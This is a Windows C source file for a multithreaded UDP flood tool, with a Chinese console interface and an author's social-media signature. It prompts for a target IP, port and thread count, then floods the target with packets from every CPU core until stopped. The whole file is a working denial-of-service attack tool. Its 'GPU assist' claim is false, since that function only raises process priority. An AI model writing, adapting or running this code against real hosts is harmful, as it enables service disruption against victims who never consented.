#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <winbase.h>

#pragma comment(lib, "ws2_32.lib")

#define PACKET_SIZE 1024

char target_ip[16];
int target_port;
int thread_count;
int reserved_core_id = -1; 
volatile int running = 1;

void enable_gpu_assist() {
    SetPriorityClass(GetCurrentProcess(), HIGH_PRIORITY_CLASS);
    SetProcessWorkingSetSize(GetCurrentProcess(), -1, -1);
}

DWORD WINAPI send_udp(LPVOID lpParam) {
    DWORD core_id = (DWORD)(size_t)lpParam;

    if (core_id != reserved_core_id) {
        SetThreadAffinityMask(GetCurrentThread(), 1 << core_id);
        SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_TIME_CRITICAL);
    } else {
        SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_NORMAL);
    }

    SOCKET sockfd;
    struct sockaddr_in server_addr;
    char buffer[PACKET_SIZE];
    
    memset(buffer, 'A', PACKET_SIZE);

    sockfd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    
    unsigned long mode = 1;
    ioctlsocket(sockfd, FIONBIO, &mode);

    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(target_port);
    inet_pton(AF_INET, target_ip, &server_addr.sin_addr);

    while (running) {
        sendto(sockfd, buffer, PACKET_SIZE, 0, (struct sockaddr *)&server_addr, sizeof(server_addr));
    }

    closesocket(sockfd);
    return 0;
}

int main() {
    WSADATA wsaData;
    HANDLE threads[1000]; 
    SYSTEM_INFO sysInfo;

    GetSystemInfo(&sysInfo);
    DWORD numCores = sysInfo.dwNumberOfProcessors;

    // 自动保留最后一个核心
    reserved_core_id = numCores - 1; 

    WSAStartup(MAKEWORD(2, 2), &wsaData);

    // === 作者签名 ===
    printf("\n\n");
    printf("========================================\n");
    printf(":                                      :\n");
    printf(":  作者: 茶茶的饲养员                  :\n");
    printf(":  抖音号: ccdsyyznb                  :\n");
    printf(":                                      :\n");
    printf("========================================\n");
    printf("\n");
    // ==================

    printf("=== Windows C CPU+GPU 究极火力核弹 ===\n");
    printf("[!] 检测到 CPU 核心数: %d\n", numCores);
    printf("[!] 自动保留核心 ID: %d (系统核心)\n", reserved_core_id);
    
    printf("请输入要保留的核心 ID (当前默认 %d): ", reserved_core_id);
    char core_str[10];
    fgets(core_str, 10, stdin);
    if (strlen(core_str) != 1) reserved_core_id = atoi(core_str);

    printf("请输入目标 IP (默认 127.0.0.1 本地测试): ");
    fgets(target_ip, 16, stdin);
    target_ip[strcspn(target_ip, "\n")] = 0; 
    if (strlen(target_ip) == 0) strcpy(target_ip, "127.0.0.1");

    printf("请输入目标端口 (默认 80): ");
    char port_str[10];
    fgets(port_str, 10, stdin);
    if (strlen(port_str) == 1) target_port = 80;
    else target_port = atoi(port_str);

    printf("请输入线程数 (默认 %d): ", numCores * 2);
    char thread_str[10];
    fgets(thread_str, 10, stdin);
    if (strlen(thread_str) == 1) thread_count = numCores * 2;
    else thread_count = atoi(thread_str);

    enable_gpu_assist();

    printf("\n[!] 核心配置: 保留核心%d，其余核心满载\n", reserved_core_id);
    printf("[!] GPU 协助: 已开启 (显存与负载将上升)\n");
    printf("[!] 准备发射... 按回车键开始...\n");
    getchar();

    printf(">>> CPU + GPU 正在全力倾泻数据... 按回车停止 <<<\n");

    for (int i = 0; i < thread_count; i++) {
        threads[i] = CreateThread(NULL, 0, send_udp, (LPVOID)(size_t)(i % numCores), 0, NULL);
    }

    getchar();
    running = 0;
    printf(">>> 停止发射...\n");

    for (int i = 0; i < thread_count; i++) {
        TerminateThread(threads[i], 0);
    }

    WSACleanup();
    printf(">>> 已停止。\n");
    return 0;
}
